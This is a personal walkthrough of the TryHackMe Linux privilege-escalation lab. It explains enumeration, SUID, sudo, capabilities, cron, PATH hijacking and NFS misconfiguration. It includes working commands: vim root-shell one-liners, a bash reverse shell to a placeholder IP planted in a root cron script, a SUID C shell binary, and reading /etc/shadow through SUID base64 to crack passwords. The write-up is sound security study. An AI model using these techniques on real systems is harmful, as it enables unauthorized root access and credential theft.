# Linux Privilege Escalation

This is a list of techniques for privilege escalation to root (or a higher-privileged user) on Linux systems.

> The original room from TryHackMe: [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc). 

## Introduction

What is Linux privilege escalation? It is when a user moves from a lower-permission account to a higher-permission one, usually root, by exploiting a vulnerability, misconfiguration, or flaw to gain access to files or resources normally restricted to them.

## Enumeration

Enumeration is important in privilege escalation, because it tells us what we are dealing with once we get initial access. Here are the basic Linux commands for enumerating the system, with their descriptions:

| Commands | Description |
| -------- | ----------- |
| `hostname` | Shows the hostname of the system |
| `uname -a` | Shows the kernel version, build number of the system |
| `/proc/version` | Shows the kernel version and compiler details (read from a file) |
| `/etc/issue` | Shows the system's identification / pre-login banner text (often the OS and version) |
| `ps` | Shows information about processes and their status | 
| `env` | Shows the environment variables, including `PATH` |
| `sudo -l` | Shows the list of commands the user is permitted to run with `sudo` |
| `ls` | Shows files in the current working directory (use `ls -la` to catch hidden files) |
| `id` | Shows general overview of the user privilege level and group membership |
| `/etc/passwd` | Shows user accounts in the system (including services accounts and root) |
| `history` | Shows earlier commands the user has typed | 
| `ifconfig` | Shows information about network interfaces |
| `netstat` | Shows existing connections |
| `find` | Searches for important information and potential privilege-escalation vectors (if you know how to use it) |

These are the basic commands worth knowing, along with how to use them. If you find them time-consuming, there are automated ways to enumerate the system. The popular ones are:

- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

I have used `LinPeas` and `LinEnum`. The need for the others has not come up yet. For a fuller walkthrough of enumeration, see my [enumeration write-up](../../02-Jr%20Penetration%20Tester/04-Linux%20Privilege%20Escalation%3A%20Enumeration.md).

## Kernel Exploits

This method should be one of the last things a pentester reaches for when escalating privileges, because whether it succeeds or fails, it can crash or destabilize the system.

A kernel exploit means exactly what it says: exploiting the Linux kernel. More often than not, Linux server machines run outdated systems (at least in CTFs), and those outdated kernels tend to have known vulnerabilities and ready-made exploits that can be found online.

For this task, the lab machine was running `Ubuntu 14.04 LTS` with kernel version `3.13.0-24-generic`. In the previous task, we were asked to find the CVE for that specific kernel, and here we use the matching exploit to gain root.

It can be fairly easy if you know what you are looking for. The first place to look is almost always Exploit-DB. In my case, I first picked the wrong entry, which said "Metasploit required", so I checked Metasploit and looked through its listings. It would likely have worked, but the number of options there overwhelmed me for a moment, so I went back to Exploit-DB and found a `.c` exploit instead.

The way it works: download or copy the `.c` source, save it, compile it with `gcc`, and run the resulting binary. That is how I gained root.

## Sudo

This is almost always the first thing to check after getting initial access. Sometimes you hit a wall, such as being asked for a password you do not have. But often you get initial access through a weak password, and running `sudo -l` reveals that the user can run some (or all) commands with `sudo`.

For this task, the teaching material and the task questions did not quite match. The teaching explains how to get root using `LD_PRELOAD` (which I will cover another time), while the questions were about which commands the user could run with `sudo` and how to get root using `nmap`. The first time I did this room, I was quite confused (no wonder it took me two to three days back then). Now I understand what `LD_PRELOAD` is (though my knowledge still needs testing), I know how to get root through `nmap` (on some versions only), and the simplest part, abusing the specific programs the user is allowed to run with `sudo`.

## SUID

`SUID` (Set User ID) and `SGID` (Set Group ID) are special Linux/Unix file permissions that let an executable run with the privileges of its owner or group, rather than those of the user running it.

I first learned about `SUID` while doing the Red Team Capstone / Red Team Essentials, and I have since used it to get root on multiple occasions. I have not yet come across a privilege escalation using `SGID`. Unlike `sudo`, you cannot list SUID/SGID binaries with a single built-in command; you have to enumerate them manually or with automated tools. One useful way, using `find`:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

When you find an unusual binary with the SUID bit set, check GTFOBins for ways to abuse it. Depending on the binary, it may allow file read, file write, or a shell.

## Linux Capabilities

I think of Linux capabilities as being in the same family as SUID or sudo: they are a way for administrators to grant a process or binary more privilege than the user would normally have, but scoped to specific abilities rather than full root.

Here is the practical approach used on the lab machine. First, search for binaries with capabilities set:

```bash
getcap -r / 2>/dev/null
```

The lab machine returned two unusual binaries with capabilities set, alongside the normal ones: `vim` and `view`. With `vim`, you can get a root shell:

With `vim`, you can get to root via:

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
Or

```bash
./vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```

## Cron Jobs

Cron jobs are scheduled tasks in Linux. They can run with different privileges depending on who created them and why. Properly configured cron jobs are not inherently vulnerable, but under some conditions they provide a privilege-escalation vector, most commonly when a job runs as root and executes a script you can write to.

System-wide cron jobs live in `/etc/crontab`. In the task scenario, a `backup.sh` file ran every minute as root. Since it was writable, you can place a reverse shell in it, start a listener on the matching port, and wait: when it runs on the next minute, you catch a root shell. The reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
```

## Linux PATH

`PATH` is an environment variable that tells the operating system where to search for executables. Linux stores binaries in default locations such as `/usr/bin`, `/usr/sbin`, `/bin`, and `/sbin`, and those directories are listed in `PATH`. That is why you can call a binary by its name alone, `find` or `base64`, instead of its full path like `/usr/bin/find`.

So if a directory that your user can write to appears in `PATH`, you may be able to hijack a program into running a script of yours instead of the real binary.

I have solved a couple of CTF rooms with this method. In one, a root-owned binary called `cp` without giving its absolute path, so I created my own `cp` script, made it executable, and placed its directory at the front of `PATH`. Linux searches `PATH` in order, so my version ran first, and I gained root. (I have a full write-up of that room.)

One thing worth adding: as with the other methods here, the target binary has to be running as root (or a higher-privileged user) for this to escalate privileges, that is what causes your script to run with those privileges. If the binary is owned by a higher-privileged user who is not root, the same trick gives you lateral movement instead.

In the task scenario, there was a SUID binary named `thm`. The exploit is the same: create your own `thm` in a writable directory, put `/bin/bash` in it, make it executable, and prepend its directory to `PATH`. When the original SUID binary runs, it calls your `thm` instead of the intended command.

## Network File Sharing (NFS)

This method abuses misconfigured network shares. The idea: if a folder is shared over NFS, you mount it on your own machine (where you have root), create a binary in it, make it executable and SUID-owned by root, and then run that binary on the target to get a root shell.

In the task I hit a snag. The steps were to create a `.c` file:

```c
#include <unistd.h>
#include <stdlib.h>

int main()
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

compile it with `gcc`, make it executable and SUID, and run it on the target. But the compiler on my machine and the target's environment did not match, which caused an error. The fix was to compile it statically:

```bash
gcc nfs.c -o nfs --static
```

After that, running `./nfs` on the target gives a root shell.

This whole thing works because of a share misconfiguration. By default, NFS applies `root_squash`, which maps a remote root user to `nobody` (UID 65534), so a root-owned SUID file from another machine does not run as root. The misconfiguration `no_root_squash` disables that, allowing root to carry over the share. You check for it in `/etc/exports`.

## Capstone Challenge

This is the final challenge of the room. The objective is to retrieve two flags, `flag1` and `flag2`. A username and password were provided for initial access, as with the other machines.

Once inside, I noticed this machine was different from the others. I ran `cat /etc/os-release` and found it was CentOS rather than Ubuntu, which almost all the other machines used. This was the first time I had used an RHEL-based Linux, and it turned out not to be very different from the Debian-based ones.

I started with `sudo -l` (wanting to work through the room's methods in order), and found the user had no sudo permissions. Next I searched for SUID binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

This returned a list of SUID binaries. The clue was there, but I initially passed over it, assuming the list was normal, until I noticed `base64` was SUID-enabled.

There are three home directories under `/home`, each readable only by its owner. Using the SUID `base64` to read files I should not have been able to, I tried the second user's flag first (the first user is me; the third is root):

```bash
base64 /home/<user2>/flag1.txt | base64 --decode
```
There was no such file. I tried root's flag:

```bash
base64 /home/<user3>/flag2.txt | base64 --decode
```

That worked. For the remaining flag, I realized I could use the SUID base64 to read `/etc/shadow`, crack the second user's password, switch to that user with `su`, and read the flag as them. That is what I did.

And that was what i did.

## Conclusion

This was meant to be a pure concept write-up, but as I wrote it and redid the room, it turned into a "how I solved this room" write-up. The room is not quite a normal CTF: you are given initial access to each machine from the start, which you usually are not in a CTF, and it has many machines plus a capstone. So it sits somewhere between a concept reference and a walkthrough. I am keeping it here because several sections double as technique explanations, but concepts I encounter in future rooms may end up in separate write-ups rather than being added to this one.
